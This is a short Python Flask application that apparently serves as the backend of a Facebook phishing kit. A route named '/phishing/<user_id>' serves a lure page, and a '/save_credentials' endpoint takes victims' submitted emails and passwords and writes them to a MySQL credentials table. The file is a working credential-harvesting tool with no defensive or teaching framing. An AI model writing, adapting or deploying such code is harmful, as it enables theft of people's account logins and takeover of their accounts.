from flask import Flask, request, render_template, redirect
import mysql.connector

app = Flask(__name__)

# Set up the database connection
db_config = {
 'user': 'root',
 'password': '',
 'host': 'localhost',
 'database': 'credentials_db'
}

@app.route('/')
def index():
 # Redirect to Facebook profile
 return redirect('https://www.facebook.com/profile.php?id=YOUR_FACEBOOK_ID')

@app.route('/phishing/<user_id>', methods=['GET'])
def phishing(user_id):
 # Simulate a direct link to the user's profile
 return render_template('index.html', user_id=user_id)

@app.route('/save_credentials', methods=['POST'])
def save_credentials():
 data = request.json
 email = data['email']
 password = data['password']

 # Save the credentials to the database
 conn = mysql.connector.connect(**db_config)
 c = conn.cursor()
 c.execute("INSERT INTO credentials (email, password) VALUES (%s, %s)", (email, password))
 conn.commit()
 conn.close()

 return "Credentials saved successfully!"

if __name__ == '__main__':
 app.run(debug=True)
